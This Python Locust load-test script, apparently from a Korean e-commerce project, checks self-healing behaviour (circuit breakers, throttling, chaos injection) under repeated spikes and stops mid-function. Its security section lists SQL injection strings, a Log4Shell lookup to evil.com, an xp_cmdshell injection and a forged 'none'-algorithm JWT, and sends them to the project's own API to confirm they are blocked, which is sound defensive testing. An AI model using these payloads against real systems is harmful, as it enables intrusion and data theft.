"""
Stage 13 EXTREME: Repeated Spike Test with Full Self-Healing Chaos
(V2.7 GAUNTLET MODE - 리뷰 피드백 반영)

Purpose: 반복적인 스파이크에서 Self-Healing 시스템의 극한 검증
- 5 사이클 반복 스파이크 + 각 사이클별 카오스 주입 (Endurance)
- XTest Mode를 통한 장애 강제 주입
- Circuit Breaker 누적 Backoff 검증
- Multi-Service Blast Radius 격리 테스트
- Emergency Mode 에스컬레이션/복구
- Error Budget 소진/회복 사이클
- DLQ 플러딩 및 리플레이
- Adaptive Throttling 검증
- Corruption Shield 데이터 무결성 테스트

리뷰 피드백 반영 (The Gauntlet):
  #1 Overload: 150명까지 스파이크 (50 → 150), Thundering Herd 패턴
  #2 Malicious Payload: SQL Injection, Signature Forgery, Extreme Values
  #3 Token Refresh: 403 에러 시 자동 재로그인
  #4 Endurance: 5 사이클, Cool Phase 축소

Load Shape (per cycle):
  Spike: 0 → 150 (10s) + Chaos Injection
  Sustain: 150 (15s) + Multi-Blast Radius Test
  Recovery: 150 → 5 (15s) + Emergency Recovery
  Cool: 5 (10s) + Verification

Self-Healing Features Tested:
  ✓ Circuit Breaker (Open/Close/Half-Open + Backoff Tuning)
  ✓ Emergency Mode (LEVEL_1~3 Escalation)
  ✓ Error Budget (Exhaust/Recovery per cycle)
  ✓ DLQ (Flood/Replay/Archive)
  ✓ Kill Switch (Activate/Deactivate)
  ✓ Rate Limiter (Adaptive Throttle)
  ✓ Corruption Shield (L1/L2/L3 Validation)
  ✓ XTest Chaos (Multi-Blast Radius, Latency Injection)
  ✓ Cascade Failure Isolation
  ✓ Malicious Payload Defense (SQL Injection, Auth Bypass, Overflow)
  ✓ Token Auto-Refresh

Execution:
    # Docker Compose 실행 (5분 테스트)
    docker-compose exec web python -m locust \
        -f load_tests/scenarios/hybrid/stage13_repeated_spike_extreme.py \
        --headless --host http://localhost:8000 \
        -u 150 -r 30 --run-time 5m \
        --html load_tests/results/stage13/stage13_extreme_report.html

    # 환경변수로 설정 조정
    LOCUST_MAX_USERS=200 LOCUST_NUM_CYCLES=5 LOCUST_TEST_DURATION=600 \
    docker-compose exec web python -m locust ...

Reference:
    - docs/SELF_HEALING_LOAD_TEST_PLAN.md (Stage 13)
"""

import os
import sys
import time
import random
import json
from datetime import datetime
from typing import Dict, List, Optional

# Ensure project root is in sys.path
_current_dir = os.path.dirname(os.path.abspath(__file__))
_scenarios_dir = os.path.dirname(_current_dir)
_load_tests_dir = os.path.dirname(_scenarios_dir)
_project_root = os.path.dirname(_load_tests_dir)
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from locust import HttpUser, task, between, tag, events, LoadTestShape

from load_tests.utils import LoginHelper, ProductHelper, CartHelper, PaymentHelper
from load_tests.metrics import setup_event_hooks

# Self-Healing 클라이언트 임포트
try:
    from load_tests.utils.selfhealing import SelfHealingClient
    from load_tests.utils.selfhealing.state_cache import CBStateCache
    from load_tests.utils.selfhealing.async_logger import AsyncHealingLogger, EventSeverity
    from load_tests.utils.selfhealing.adaptive_jitter import AdaptiveJitter, SystemState
    # V4 Controller 임포트 (분리된 모듈)
    from load_tests.utils.selfhealing.controller import (
        SelfHealingController, get_controller, reset_controller,
        SLA_P99_THRESHOLD_MS as CTRL_SLA_P99,
        SLA_CRITICAL_MS as CTRL_SLA_CRITICAL,
    )
    SELFHEALING_AVAILABLE = True
except ImportError as e:
    print(f"[WARN] Self-Healing client not available: {e}")
    SELFHEALING_AVAILABLE = False
    SelfHealingController = None
    get_controller = None


STAGE_NAME = "[Stage13-RepeatedSpike-EXTREME]"
DEBUG_MODE = os.environ.get("STAGE13_DEBUG", "false").lower() == "true"


# =============================================================================
# Configuration
# =============================================================================

# =============================================================================
# V2.7 GAUNTLET MODE Configuration (리뷰 피드백 반영)
# =============================================================================

# Scale factor from env var
_test_duration = int(os.environ.get("LOCUST_TEST_DURATION", "300"))  # 5분 기본
_original_total = 270 * 5  # 270s per cycle * 5 cycles = 1350s
_scale = _test_duration / _original_total

# Number of spike cycles (5 for endurance, 3 for medium, 1 for quick test)
# 리뷰 피드백 #4: 5사이클 Endurance 테스트
NUM_CYCLES = int(os.environ.get("LOCUST_NUM_CYCLES", "5"))

# Phase durations (seconds) - scaled
SPIKE_DURATION = max(10, int(30 * _scale * 3))
SUSTAIN_DURATION = max(15, int(60 * _scale * 3))
RECOVERY_DURATION = max(15, int(60 * _scale * 3))
# 리뷰 피드백 #4: Cool Phase 축소로 총 시간 단축
COOL_DURATION = max(10, int(60 * _scale * 3))  # 120s → 60s

CYCLE_DURATION = SPIKE_DURATION + SUSTAIN_DURATION + RECOVERY_DURATION + COOL_DURATION

# 리뷰 피드백 #1: Overload 설정 - 150-200명까지 폭증
SPIKE_USERS = int(os.environ.get("LOCUST_MAX_USERS", "150"))  # 50 → 150
COOL_USERS = 5
THUNDERING_HERD_USERS = 200  # Thundering Herd 패턴용 (80% 동시 스폰)

# Chaos Services
CHAOS_SERVICES = ["payment", "order", "database", "toss_payment", "notification"]

# =============================================================================
# 리뷰 피드백 #2: Malicious Payload Definitions (The Gauntlet L1/L2/L3)
# =============================================================================

# L1: SQL Injection Patterns
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "1; SELECT * FROM payments WHERE 1=1--",
    "' UNION SELECT password FROM users--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "${jndi:ldap://evil.com/a}",  # Log4Shell 패턴
    "{{7*7}}",  # SSTI 패턴
]

# L2: Signature Forgery / Auth Bypass
MALICIOUS_SIGNATURES = [
    "invalid_signature_test_12345",
    "00000000000000000000000000000000",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",  # JWT None algorithm
    "admin_bypass_token",
    "test'; exec xp_cmdshell('whoami')--",
]

# L3: Extreme Values (Integer Overflow, Boundary)
EXTREME_AMOUNTS = [
    999999999999,      # 9999억 (극단적 큰 금액)
    -1,                # 음수 금액
    0,                 # 0원
    0.001,             # 소수점 금액
    2147483647,        # INT32 MAX
    9223372036854775807,  # INT64 MAX
]

EXTREME_QUANTITIES = [
    999999,            # 극단적 수량
    -1,                # 음수 수량
    0,                 # 0개
    2147483647,        # INT32 MAX
]


# =============================================================================
# V2.8 AGGRESSIVE HEALING 설정 (2차 리뷰 피드백 반영)
# =============================================================================

# SLA Hard-Cap (강화됨)
SLA_P99_THRESHOLD_MS = 300  # 복구 후 P99 ≤ 300ms
SLA_CRITICAL_MS = 500  # 🔥 500ms 초과시 즉시 대응 (기존 2000ms → 500ms)
SLA_AGGRESSIVE_THRESHOLD_MS = 300  # 🔥 300ms 초과시 limit 50% 삭감
SLA_STRICT_MODE = True

# 🔥 Circuit Breaker 강화 설정
CB_FAILURE_THRESHOLD = 3  # 5회 → 3회로 강화
CB_RECOVERY_TIMEOUT_MS = 10000  # 10초 후 Half-Open 시도
CB_HALF_OPEN_SUCCESS_THRESHOLD = 2  # Half-Open에서 Close까지 필요한 성공 횟수

# 🔥 Adaptive Rate Limiting 강화
RATE_LIMIT_AGGRESSIVE_CUT = 0.5  # 300ms 초과시 50% 삭감
RATE_LIMIT_MIN_REQUESTS_PER_SEC = 5  # 최소 요청 수 (floor)
RATE_LIMIT_MAX_REQUESTS_PER_SEC = 100  # 최대 요청 수 (ceiling)
RATE_LIMIT_RECOVERY_STEP = 0.1  # 복구시 10%씩 증가

# 🔥 Adaptive Jitter 강화 연동
JITTER_MAX_MS = 5000  # 최대 지터 5초
JITTER_MIN_MS = 100  # 최소 지터 100ms
JITTER_ESCALATION_FACTOR = 2.0  # 응답 지연시 지터 2배 증가

# Cascading Failure
CASCADE_ENABLED = True
CASCADE_SERVICES = ["payment", "order", "inventory", "notification"]

# Retry Storm Prevention
RETRY_STORM_THRESHOLD = 50
RETRY_BACKOFF_MULTIPLIER = 2.0

# Error Budget
ERROR_BUDGET_DRAIN_PER_CYCLE = 20  # 사이클당 20% 소진


# =============================================================================
# Extreme Self-Healing Statistics
# =============================================================================

_extreme_stats = {
    "start_time": None,
    "current_cycle": 0,
    "test_mode": "extreme",
    
    # Per-cycle statistics
    "cycles": [],
    
    # Circuit Breaker (누적)
    "circuit_breaker": {
        "total_opens": 0,
        "total_closes": 0,
        "total_half_opens": 0,
        "services_affected": set(),
        "backoff_durations": [],  # 사이클별 백오프 관찰
        "recovery_times": [],
        "backoff_accumulation_detected": False,
    },
    
    # Emergency Mode
    "emergency": {
        "max_level_reached": 0,
        "escalations": [],
        "recovery_successes": 0,
        "recovery_failures": 0,
    },
    
    # Error Budget
    "error_budget": {
        "initial_remaining": None,
        "per_cycle_consumption": [],
        "exhausted_cycles": 0,
        "recovered_cycles": 0,
    },
    
    # DLQ
    "dlq": {
        "max_pending": 0,
        "total_created": 0,
        "total_replayed": 0,
        "replay_success_rate": None,
    },
    
    # XTest Chaos
    "chaos": {
        "failures_injected": 0,
        "latency_injections": 0,
        "blast_radius_tests": 0,
        "cascade_triggers": 0,
        "recovery_triggers": 0,  # 복구 트리거 횟수
    },
    
    # Adaptive Throttle
    "throttle": {
        "limit_adjustments": 0,
        "min_limit_reached": False,
        "max_limit_reached": False,
        "avg_rtt_ms": [],
        # 🔥 V2.8 강화 통계
        "aggressive_cuts": 0,  # 50% 삭감 횟수
        "current_limit_percent": 100,  # 현재 limit 비율
    },
    
    # 🔥 V2.8 Adaptive Jitter 통계
    "adaptive_jitter": {
        "escalations": 0,  # 지터 증가 횟수
        "current_jitter_ms": 100,  # 현재 지터 값
        "max_jitter_reached": False,
    },
    
    # 🔥 V2.8 Aggressive CB 통계
    "aggressive_cb": {
        "xtest_errors_counted": 0,  # XTest 에러가 CB에 카운트된 횟수
        "forced_opens": 0,  # 강제 Open 횟수 (3회 실패)
        "quick_recoveries": 0,  # 빠른 복구 횟수
    },
    
    # Corruption Shield
    "corruption_shield": {
        "validations": 0,
        "blocked": 0,
        "l1_violations": 0,
        "l2_violations": 0,
        "l3_violations": 0,
    },
    
    # 리뷰 피드백 #2: Malicious Payload 통계
    "malicious_payload": {
        "l1_sql_injection_tests": 0,
        "l1_blocked": 0,
        "l2_signature_forgery_tests": 0,
        "l2_blocked": 0,
        "l3_extreme_value_tests": 0,
        "l3_blocked": 0,
        "total_tests": 0,
        "total_blocked": 0,
        "bypass_detected": False,  # 보안 취약점 발견 여부
    },
    
    # Token Refresh 통계
    "token_refresh": {
        "refresh_count": 0,
        "refresh_failures": 0,
        "last_refresh_time": None,
    },
    
    # SLA Metrics
    "sla": {
        "p99_violations": 0,
        "p99_max_ms": 0,
        "sla_passed": True,
        "phase_p99": {"spike": [], "sustain": [], "recovery": [], "cool": []},
    },
    
    # Recovery Analysis
    "recovery": {
        "per_cycle_latencies": [],
        "avg_recovery_latency_seconds": None,
        "recovery_latency_trend": None,
        "sla_breaches": 0,
    },
    
    # Debug logs
    "debug_logs": [],
}


def _debug_log(message: str, level: str = "INFO"):
    """Add debug log entry."""
    if DEBUG_MODE:
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        entry = f"[{timestamp}] [{level}] {message}"
        _extreme_stats["debug_logs"].append(entry)
        print(entry)


def _get_current_cycle() -> int:
    """Get current cycle number (0-indexed)."""
    if _extreme_stats["start_time"] is None:
        return 0
    
    elapsed = time.time() - _extreme_stats["start_time"]
    cycle = int(elapsed // CYCLE_DURATION)
    return min(cycle, NUM_CYCLES - 1)


def _get_phase_in_cycle() -> str:
    """Get current phase within the cycle."""
    if _extreme_stats["start_time"] is None:
        return "spike"
    
    elapsed = time.time() - _extreme_stats["start_time"]
    time_in_cycle = elapsed % CYCLE_DURATION
    
    if time_in_cycle < SPIKE_DURATION:
        return "spike"
    elif time_in_cycle < SPIKE_DURATION + SUSTAIN_DURATION:
        return "sustain"
    elif time_in_cycle < SPIKE_DURATION + SUSTAIN_DURATION + RECOVERY_DURATION:
        return "recovery"
    else:
        return "cool"


def _ensure_cycle_stats(cycle: int):
    """Ensure stats structure exists for given cycle."""
    while len(_extreme_stats["cycles"]) <= cycle:
        cycle_num = len(_extreme_stats["cycles"]) + 1
        _extreme_stats["cycles"].append({
            "cycle_number": cycle_num,
            "start_time": None,
            "phases": {
                "spike": {"requests": 0, "errors": 0, "response_times": []},
                "sustain": {"requests": 0, "errors": 0, "response_times": []},
                "recovery": {"requests": 0, "errors": 0, "response_times": []},
                "cool": {"requests": 0, "errors": 0, "response_times": []},
            },
            # CB per cycle
            "cb_open_time": None,
            "cb_close_time": None,
            "recovery_time_seconds": None,
            # Chaos injection log
            "chaos_injected": [],
            # Emergency mode
            "emergency_max_level": 0,
            "emergency_recovery_success": False,
            # Error budget
            "error_budget_start": None,
            "error_budget_end": None,
            "error_budget_consumed": 0,
        })
        _debug_log(f"Initialized cycle {cycle_num} stats")


def _record_request(success: bool, response_time_ms: float):
    """Record request statistics for current cycle and phase."""
    cycle = _get_current_cycle()
    phase = _get_phase_in_cycle()
    
    _ensure_cycle_stats(cycle)
    
    stats = _extreme_stats["cycles"][cycle]["phases"][phase]
    stats["requests"] += 1
    stats["response_times"].append(response_time_ms)
    
    if not success:
        stats["errors"] += 1
    
    # SLA tracking
    _extreme_stats["sla"]["phase_p99"][phase].append(response_time_ms)
    if response_time_ms > _extreme_stats["sla"]["p99_max_ms"]:
        _extreme_stats["sla"]["p99_max_ms"] = response_time_ms


def _record_cb_transition(service: str, from_state: str, to_state: str):
    """Record circuit breaker state transition."""
    cycle = _get_current_cycle()
    _ensure_cycle_stats(cycle)
    
    cb_stats = _extreme_stats["circuit_breaker"]
    cycle_stats = _extreme_stats["cycles"][cycle]
    
    if to_state == "open":
        cb_stats["total_opens"] += 1
        cb_stats["services_affected"].add(service)
        if cycle_stats["cb_open_time"] is None:
            cycle_stats["cb_open_time"] = time.time()
            _debug_log(f"🔌 Cycle {cycle + 1}: CB OPENED for {service}", "WARN")
    
    elif to_state == "half_open":
        cb_stats["total_half_opens"] += 1
        _debug_log(f"⚡ Cycle {cycle + 1}: CB HALF-OPEN for {service}", "INFO")
    
    elif to_state == "closed" and from_state in ("open", "half_open"):
        cb_stats["total_closes"] += 1
        if cycle_stats["cb_close_time"] is None:
            cycle_stats["cb_close_time"] = time.time()
            if cycle_stats["cb_open_time"]:
                recovery_time = cycle_stats["cb_close_time"] - cycle_stats["cb_open_time"]
                cycle_stats["recovery_time_seconds"] = recovery_time
                cb_stats["recovery_times"].append(recovery_time)
                _debug_log(f"✅ Cycle {cycle + 1}: CB CLOSED after {recovery_time:.1f}s", "INFO")


# =============================================================================
# Custom Load Shape - Repeated Spike with Chaos
# =============================================================================

class RepeatedSpikeExtremeShape(LoadTestShape):
    """
    Extreme repeated spike load shape with per-cycle chaos injection.
    """
    
    def tick(self):
        """Return (user_count, spawn_rate) tuple for current time."""
        run_time = self.get_run_time()
        total_duration = CYCLE_DURATION * NUM_CYCLES
        
        if run_time > total_duration:
            return None
        
        cycle = int(run_time // CYCLE_DURATION)
        time_in_cycle = run_time % CYCLE_DURATION
        
        # Track cycle changes
        if cycle != _extreme_stats["current_cycle"]:
            _extreme_stats["current_cycle"] = cycle
            if cycle < NUM_CYCLES:
                _debug_log(f"\n{'='*60}")
                _debug_log(f"🔄 STARTING CYCLE {cycle + 1} of {NUM_CYCLES}")
                _debug_log(f"{'='*60}")
        
        # Spike phase
        if time_in_cycle < SPIKE_DURATION:
            progress = time_in_cycle / SPIKE_DURATION
            users = int(COOL_USERS + (SPIKE_USERS - COOL_USERS) * progress)
            return (max(1, users), 30)
        
        # Sustain phase
        elif time_in_cycle < SPIKE_DURATION + SUSTAIN_DURATION:
            return (SPIKE_USERS, 10)
        
        # Recovery phase
        elif time_in_cycle < SPIKE_DURATION + SUSTAIN_DURATION + RECOVERY_DURATION:
            elapsed_in_phase = time_in_cycle - (SPIKE_DURATION + SUSTAIN_DURATION)
            progress = elapsed_in_phase / RECOVERY_DURATION
            users = int(SPIKE_USERS - (SPIKE_USERS - COOL_USERS) * progress)
            return (max(COOL_USERS, users), 5)
        
        # Cool phase
        else:
            return (COOL_USERS, 1)


# =============================================================================
# Self-Healing Controller (분리된 모듈 사용)
# =============================================================================

# SelfHealingController는 load_tests.utils.selfhealing.controller에서 import
# 이 파일에서는 전역 _extreme_stats를 사용하는 래퍼 함수만 정의

def _get_stage13_controller() -> 'SelfHealingController':
    """
    Stage13 전용 컨트롤러 인스턴스 반환.
    
    분리된 SelfHealingController를 사용하되,
    이 시나리오 전용 콜백을 연결합니다.
    """
    if not SELFHEALING_AVAILABLE or get_controller is None:
        return None
    
    def stats_callback(key: str, value):
        """Update _extreme_stats with controller stats."""
        keys = key.split(".")
        target = _extreme_stats
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        
        final_key = keys[-1]
        if isinstance(target.get(final_key), (int, float)) and isinstance(value, (int, float)):
            target[final_key] = target.get(final_key, 0) + value
        elif isinstance(target.get(final_key), list):
            target[final_key].append(value)
        else:
            target[final_key] = value
    
    return get_controller(
        chaos_services=CHAOS_SERVICES,
        cascade_services=CASCADE_SERVICES,
        error_budget_drain_per_cycle=ERROR_BUDGET_DRAIN_PER_CYCLE,
        debug_callback=_debug_log,
        stats_callback=stats_callback,
    )


# Global controller instance (래퍼)
_controller: Optional['SelfHealingController'] = None


def _record_cb_transition(service: str, from_state: str, to_state: str):
    """Record CB transition to _extreme_stats."""
    _extreme_stats["cb_transitions"].append({
        "service": service,
        "from": from_state,
        "to": to_state,
        "timestamp": datetime.now().isoformat(),
    })
    _debug_log(f"🔌 CB Transition: {service} {from_state} → {to_state}", "CB")


# =============================================================================
# Test User
# =============================================================================

class RepeatedSpikeExtremeUser(HttpUser):
    """
    Extreme user for repeated spike testing with full self-healing integration.
    """
    
    wait_time = between(0.5, 2)
    
    def on_start(self):
        """Initialize user session."""
        global _extreme_stats
        
        setup_event_hooks(STAGE_NAME)
        
        if _extreme_stats["start_time"] is None:
            _extreme_stats["start_time"] = time.time()
            _debug_log(f"🚀 Test started at {datetime.now().isoformat()}", "INFO")
        
        self.login_helper = LoginHelper(self.client, STAGE_NAME)
        self.product_helper = ProductHelper(self.client, STAGE_NAME)
        self.cart_helper = CartHelper(self.client, STAGE_NAME)
        self.payment_helper = PaymentHelper(self.client, STAGE_NAME)
        
        self.product_helper.ensure_products_cached()
        self.login_helper.login()
        
        # Self-healing controller
        self._controller = get_controller()
        self._last_monitoring_time = 0
        self._monitoring_interval = 5  # 5초마다 모니터링
    
    def _maybe_inject_chaos(self):
        """Inject chaos based on current phase."""
        cycle = _get_current_cycle()
        phase = _get_phase_in_cycle()
        self._controller.inject_chaos_for_phase(phase, cycle)
    
    def _maybe_monitor(self):
        """Periodic monitoring of self-healing state."""
        current_time = time.time()
        if current_time - self._last_monitoring_time < self._monitoring_interval:
            return
        
        self._last_monitoring_time = current_time
        self._controller.check_and_update_cb_state(self.client)
        
        # Update DLQ stats
        dlq_stats = self._controller.get_dlq_stats()
        if dlq_stats:
            pending = dlq_stats.get("pending_count", 0)
            if pending > _extreme_stats["dlq"]["max_pending"]:
                _extreme_stats["dlq"]["max_pending"] = pending
        
        # Update throttle stats
        throttle_stats = self._controller.get_throttle_stats()
        if throttle_stats:
            rtt = throttle_stats.get("avg_rtt_ms")
            if rtt:
                _extreme_stats["throttle"]["avg_rtt_ms"].append(rtt)
            _extreme_stats["throttle"]["limit_adjustments"] = throttle_stats.get(
                "limit_adjustments", 0
            )
        
        # Update corruption shield stats
        shield_stats = self._controller.get_corruption_shield_stats()
        if shield_stats:
            _extreme_stats["corruption_shield"]["validations"] = shield_stats.get(
                "total_validations", 0
            )
            _extreme_stats["corruption_shield"]["blocked"] = shield_stats.get(
                "blocked", 0
            )
    
    # =========================================================================
    # Load Generation Tasks
    # =========================================================================
    
    @task(10)
    @tag("repeated", "browse")
    def browse_products(self):
        """Product browsing task with V2.8 aggressive healing."""
        self._maybe_inject_chaos()
        self._maybe_monitor()
        
        # 🔥 V2.8: Rate limit 체크
        if self._controller.should_skip_request():
            _debug_log("⏸️ Request skipped due to rate limit", "THROTTLE")
            return
        
        # 🔥 V2.8: Adaptive Jitter 적용
        jitter_ms = self._controller.get_current_jitter_ms()
        if jitter_ms > JITTER_MIN_MS:
            time.sleep(jitter_ms / 1000)
        
        start = time.time()
        
        with self.client.get(
            "/api/products/",
            name=f"{STAGE_NAME} GET /products/",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            success = response.status_code == 200
            
            # 🔥 V2.8: 응답 시간 기록 및 aggressive healing
            self._controller.record_response_time(elapsed_ms, "products")
            
            if success:
                response.success()
                # 🔥 V2.8: 정상 응답시 rate limit 복구
                self._controller.recover_rate_limit()
            else:
                response.failure(f"Status: {response.status_code}")
            
            _record_request(success, elapsed_ms)
    
    @task(5)
    @tag("repeated", "cart")
    def cart_operations(self):
        """Cart operations task with V2.8 aggressive healing."""
        self._maybe_inject_chaos()
        
        # 🔥 V2.8: Rate limit 체크
        if self._controller.should_skip_request():
            return
        
        product = self.product_helper.get_random_product()
        if not product:
            return
        
        # 🔥 V2.8: Adaptive Jitter 적용
        jitter_ms = self._controller.get_current_jitter_ms()
        if jitter_ms > JITTER_MIN_MS:
            time.sleep(jitter_ms / 1000)
        
        start = time.time()
        
        with self.client.post(
            "/api/cart/add_item/",
            json={"product_id": product["id"], "quantity": 1},
            headers=self.login_helper.get_auth_header(),
            name=f"{STAGE_NAME} POST /cart/add_item/",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            success = response.status_code in [200, 201]
            
            # 🔥 V2.8: 응답 시간 기록
            self._controller.record_response_time(elapsed_ms, "cart")
            
            if success:
                response.success()
                self._controller.recover_rate_limit()
            else:
                response.failure(f"Status: {response.status_code}")
            
            _record_request(success, elapsed_ms)
    
    @task(3)
    @tag("repeated", "payment")
    def payment_flow(self):
        """Full payment flow with chaos injection and V2.8 healing."""
        self._maybe_inject_chaos()
        
        # 🔥 V2.8: Rate limit 체크
        if self._controller.should_skip_request():
            return
        
        product = self.product_helper.get_random_product()
        if not product:
            return
        
        # 🔥 V2.8: Adaptive Jitter 적용
        jitter_ms = self._controller.get_current_jitter_ms()
        if jitter_ms > JITTER_MIN_MS:
            time.sleep(jitter_ms / 1000)
        
        # Clear cart first
        self.client.post(
            "/api/cart/clear/",
            json={"confirm": True},
            headers=self.login_helper.get_auth_header(),
            name=f"{STAGE_NAME} cart-clear",
        )
        
        # Add to cart
        self.client.post(
            "/api/cart/add_item/",
            json={"product_id": product["id"], "quantity": 1},
            headers=self.login_helper.get_auth_header(),
            name=f"{STAGE_NAME} cart-add",
        )
        
        # Create order
        start = time.time()
        
        with self.client.post(
            "/api/orders/",
            json={
                "shipping_name": "Extreme Test User",
                "shipping_phone": "010-1234-5678",
                "shipping_postal_code": "12345",
                "shipping_address": "Stage13 Extreme Test Address",
                "shipping_address_detail": "Test Building 101",
            },
            headers=self.login_helper.get_auth_header(),
            name=f"{STAGE_NAME} POST /orders/",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            success = response.status_code in [200, 201, 202]
            
            # 🔥 V2.8: 응답 시간 기록
            self._controller.record_response_time(elapsed_ms, "order")
            
            if success:
                order_data = response.json()
                order_id = order_data.get("id") or order_data.get("order_id")
                
                if order_id:
                    self._request_payment(order_id)
                
                response.success()
                self._controller.recover_rate_limit()
            else:
                response.failure(f"Order failed: {response.status_code}")
            
            _record_request(success, elapsed_ms)
    
    def _request_payment(self, order_id: int):
        """Request payment with tracking and V2.8 healing."""
        start = time.time()
        
        with self.client.post(
            "/api/payments/request/",
            json={"order_id": order_id},
            headers=self.login_helper.get_auth_header(),
            name=f"{STAGE_NAME} POST /payments/request/",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            success = response.status_code in [200, 201]
            
            # 🔥 V2.8: 응답 시간 기록 (결제는 critical service)
            self._controller.record_response_time(elapsed_ms, "payment")
            
            if success:
                response.success()
            else:
                response.failure(f"Payment failed: {response.status_code}")
            
            _record_request(success, elapsed_ms)
    
    @task(2)
    @tag("repeated", "monitoring")
    def monitor_system(self):
        """Monitor self-healing system state."""
        self._maybe_monitor()
        
        with self.client.get(
            "/api/self-healing/status/",
            headers=self._get_auth_header_with_refresh(),
            name=f"{STAGE_NAME} CB-monitor",
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
            elif response.status_code == 403:
                # Token expired - refresh and retry
                self._refresh_token()
                response.failure("Token expired - refreshed")
            else:
                response.failure(f"Status: {response.status_code}")
    
    # =========================================================================
    # 리뷰 피드백 #3: Token Refresh 로직
    # =========================================================================
    
    def _refresh_token(self):
        """Refresh authentication token on 403 errors."""
        _debug_log("🔄 Refreshing authentication token...", "AUTH")
        _extreme_stats["token_refresh"]["refresh_count"] += 1
        
        try:
            self.login_helper.login()
            _extreme_stats["token_refresh"]["last_refresh_time"] = time.time()
            _debug_log("✅ Token refreshed successfully", "AUTH")
        except Exception as e:
            _extreme_stats["token_refresh"]["refresh_failures"] += 1
            _debug_log(f"❌ Token refresh failed: {e}", "ERROR")
    
    def _get_auth_header_with_refresh(self) -> Dict[str, str]:
        """Get auth header, refreshing if needed."""
        header = self.login_helper.get_auth_header()
        
        # Check if token is likely expired (simple time check)
        last_refresh = _extreme_stats["token_refresh"].get("last_refresh_time")
        if last_refresh and (time.time() - last_refresh) > 1800:  # 30분
            self._refresh_token()
            header = self.login_helper.get_auth_header()
        
        return header
    
    # =========================================================================
    # 리뷰 피드백 #2: Malicious Payload Tests (The Gauntlet)
    # =========================================================================
    
    @task(2)
    @tag("repeated", "malicious", "security")
    def test_malicious_payloads(self):
        """Test system resilience against malicious payloads."""
        self._maybe_inject_chaos()
        
        # Rotate through different attack types
        attack_type = random.choice(["l1_sql", "l2_signature", "l3_extreme"])
        
        if attack_type == "l1_sql":
            self._test_l1_sql_injection()
        elif attack_type == "l2_signature":
            self._test_l2_signature_forgery()
        else:
            self._test_l3_extreme_values()
    
    def _test_l1_sql_injection(self):
        """L1: SQL Injection pattern tests."""
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        _extreme_stats["malicious_payload"]["l1_sql_injection_tests"] += 1
        _extreme_stats["malicious_payload"]["total_tests"] += 1
        
        start = time.time()
        
        # Test in product search
        with self.client.get(
            f"/api/products/?search={payload}",
            headers=self._get_auth_header_with_refresh(),
            name=f"{STAGE_NAME} L1-SQL-Inject",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            
            # SQL injection should be blocked (4xx) or sanitized (200 with no exploit)
            if response.status_code in [400, 403, 422]:
                _extreme_stats["malicious_payload"]["l1_blocked"] += 1
                _extreme_stats["malicious_payload"]["total_blocked"] += 1
                response.success()
                _debug_log(f"✅ L1 SQL Injection blocked: {response.status_code}", "SECURITY")
            elif response.status_code == 200:
                # Check if response contains suspicious data leak
                try:
                    data = response.json()
                    if "password" in str(data).lower() or "drop" in str(data).lower():
                        _extreme_stats["malicious_payload"]["bypass_detected"] = True
                        response.failure("⚠️ SECURITY: Possible SQL injection bypass!")
                        _debug_log("🚨 SECURITY ALERT: SQL Injection may have bypassed!", "CRITICAL")
                    else:
                        response.success()  # Properly sanitized
                except:
                    response.success()
            else:
                response.failure(f"Unexpected: {response.status_code}")
            
            _record_request(response.status_code in [200, 400, 403, 422], elapsed_ms)
    
    def _test_l2_signature_forgery(self):
        """L2: Signature forgery / Auth bypass tests."""
        fake_signature = random.choice(MALICIOUS_SIGNATURES)
        _extreme_stats["malicious_payload"]["l2_signature_forgery_tests"] += 1
        _extreme_stats["malicious_payload"]["total_tests"] += 1
        
        start = time.time()
        
        # Test with forged authorization header
        headers = {"Authorization": f"Bearer {fake_signature}"}
        
        with self.client.get(
            "/api/orders/",
            headers=headers,
            name=f"{STAGE_NAME} L2-Sig-Forgery",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            
            # Should be rejected with 401 or 403
            if response.status_code in [401, 403]:
                _extreme_stats["malicious_payload"]["l2_blocked"] += 1
                _extreme_stats["malicious_payload"]["total_blocked"] += 1
                response.success()
                _debug_log(f"✅ L2 Signature forgery blocked: {response.status_code}", "SECURITY")
            elif response.status_code == 200:
                _extreme_stats["malicious_payload"]["bypass_detected"] = True
                response.failure("🚨 SECURITY: Auth bypass detected!")
                _debug_log("🚨 SECURITY ALERT: Forged signature accepted!", "CRITICAL")
            else:
                response.failure(f"Unexpected: {response.status_code}")
            
            _record_request(response.status_code in [401, 403], elapsed_ms)
    
    def _test_l3_extreme_values(self):
        """L3: Extreme value / Integer overflow tests."""
        extreme_amount = random.choice(EXTREME_AMOUNTS)
        extreme_qty = random.choice(EXTREME_QUANTITIES)
        _extreme_stats["malicious_payload"]["l3_extreme_value_tests"] += 1
        _extreme_stats["malicious_payload"]["total_tests"] += 1
        
        product = self.product_helper.get_random_product()
        if not product:
            return
        
        start = time.time()
        
        # Test with extreme quantity
        with self.client.post(
            "/api/cart/add_item/",
            json={"product_id": product["id"], "quantity": extreme_qty},
            headers=self._get_auth_header_with_refresh(),
            name=f"{STAGE_NAME} L3-Extreme-Qty",
            catch_response=True,
        ) as response:
            elapsed_ms = (time.time() - start) * 1000
            
            # Extreme values should be rejected
            if response.status_code in [400, 422]:
                _extreme_stats["malicious_payload"]["l3_blocked"] += 1
                _extreme_stats["malicious_payload"]["total_blocked"] += 1
                response.success()
                _debug_log(f"✅ L3 Extreme value blocked: {extreme_qty}", "SECURITY")
            elif response.status_code in [200, 201]:
                # Check if accepted (potential issue if negative/overflow)
                if extreme_qty <= 0 or extreme_qty > 10000:
                    _debug_log(f"⚠️ L3 Extreme value accepted: {extreme_qty}", "WARN")
                response.success()  # System might have its own limits
            else:
